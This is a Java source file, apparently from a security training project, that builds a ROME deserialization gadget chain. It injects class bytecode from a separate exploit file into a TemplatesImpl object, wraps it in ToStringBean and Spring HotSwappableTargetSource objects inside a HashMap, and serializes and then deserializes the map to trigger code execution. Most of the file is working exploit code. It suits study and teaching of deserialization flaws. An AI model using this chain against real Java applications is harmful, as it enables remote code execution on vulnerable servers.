package com.madaha.codesecone.controller.AdvancedAttack.deserialize.RomeDeserialize;

import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class ROME_HotSwappableTargetSource_PocTest {
    // 获取项目根目录，设置expPath;
    private static String projectRoot = System.getProperty("user.dir");
    private static String rome_ser_Path = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\RomeDeserialize\\ROME_Poc.ser";
    private static String TemplatesImpl_class_Path = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\Exploit\\TemplatesImpl_Exploit.class";

    // 反射修改 Field 方法；
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    // 序列化
    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(rome_ser_Path));
        objectOutputStream.writeObject(obj);
    }

    // 反序列化
    public static Object deserialize(String filePath) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
        return objectInputStream.readObject();
    }


    public static void rome_HotSwappableTargetSource_Poc() throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        byte[] bytecodes = Files.readAllBytes(Paths.get(TemplatesImpl_class_Path));

        setFieldValue(templatesimpl, "_name", "PocTest");
        setFieldValue(templatesimpl, "_bytecodes", new byte[][] {bytecodes});
        setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("PocTest"));

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(h1, h1);
        hashMap.put(h2, h2);

        serialize(hashMap);
        deserialize(rome_ser_Path);
    }

    public static void main(String[] args) throws  Exception {
//        rome_HotSwappableTargetSource_Poc();
        deserialize(rome_ser_Path);

    }

}
